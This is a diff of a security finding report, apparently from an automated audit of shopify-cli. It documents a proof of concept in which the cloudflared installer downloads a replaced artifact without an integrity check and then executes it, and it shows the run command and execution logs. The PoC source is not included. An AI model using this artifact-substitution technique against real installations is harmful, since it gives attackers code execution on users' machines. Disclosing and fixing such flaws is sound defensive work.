@@ -68,15 +68,15 @@ The self-contained PoC at `piolium/findings/p10-cloudflared-download-exec-no-int
 Run:
 
 ```bash
-cd /Users/bytedance/Desktop/oss-to-run/shopify-cli
+cd /Users/j3ssie/Desktop/oss-to-run/shopify-cli
 node piolium/findings/p10-cloudflared-download-exec-no-integrity/poc.js
 ```
 
 The executed evidence shows the installer accepted the replacement macOS artifact from the expected release URL, wrote it to the cloudflared bin path, and then executed it as the tunnel process:
 
 ```text
-installer fetch log: {"url":"https://github.com/cloudflare/cloudflared/releases/download/2024.8.2/cloudflared-darwin-arm64.tgz","redirect":"follow","mode":"slow-request","artifact":"/Users/bytedance/Desktop/oss-to-run/shopify-cli/piolium/findings/p10-cloudflared-download-exec-no-integrity/evidence/work/cloudflared-darwin.tgz","bytes":299}
-installed binary: /Users/bytedance/Desktop/oss-to-run/shopify-cli/piolium/findings/p10-cloudflared-download-exec-no-integrity/evidence/work/bin/cloudflared
+installer fetch log: {"url":"https://github.com/cloudflare/cloudflared/releases/download/2024.8.2/cloudflared-darwin-arm64.tgz","redirect":"follow","mode":"slow-request","artifact":"/Users/j3ssie/Desktop/oss-to-run/shopify-cli/piolium/findings/p10-cloudflared-download-exec-no-integrity/evidence/work/cloudflared-darwin.tgz","bytes":299}
+installed binary: /Users/j3ssie/Desktop/oss-to-run/shopify-cli/piolium/findings/p10-cloudflared-download-exec-no-integrity/evidence/work/bin/cloudflared
 tunnel status: {"status":"connected","url":"https://poc.trycloudflare.com"}
 impact log: cloudflared payload executed | argv=tunnel --url http://localhost:18181 --no-autoupdate | uid=501
 {"status":"confirmed","evidence":"impact.log shows downloaded cloudflared payload executed by tunnel launcher","notes":"downloaded bytes were written to the cloudflared bin path before execution"}
